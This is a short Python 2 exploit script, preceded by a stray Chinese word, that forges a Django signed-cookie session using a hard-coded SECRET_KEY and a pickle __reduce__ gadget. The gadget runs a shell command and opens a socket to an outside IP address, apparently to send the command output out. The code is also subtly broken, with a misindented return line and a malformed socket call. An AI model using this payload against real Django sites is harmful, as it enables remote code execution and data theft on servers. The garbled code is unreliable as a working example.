# scroll
滚动条
# coding: utf-8
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
from django.conf import settings

settings.configure(SECRET_KEY='oa4$kkk802=rfm@tl^e5yb3qvs_ea3r!m*&j+#_+s-9=xcieci')  # SECRET_KEY 参数的值为 demo Django 项目的 SECRET_KEY 值


class CreateTmpFile(object):
    def __reduce__(self):
        import subprocess
         return (subprocess.call,
                (['python',
                  '-c',
                  'import os,socket;c=os.popen("ls").read().strip();'
                  's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
                  's.connect(c,("103.224.82.158",31337));'],))


sess = signing.dumps(
    obj=CreateTmpFile(),
    serializer=PickleSerializer,
    salt='django.contrib.sessions.backends.signed_cookies'
)
print sess
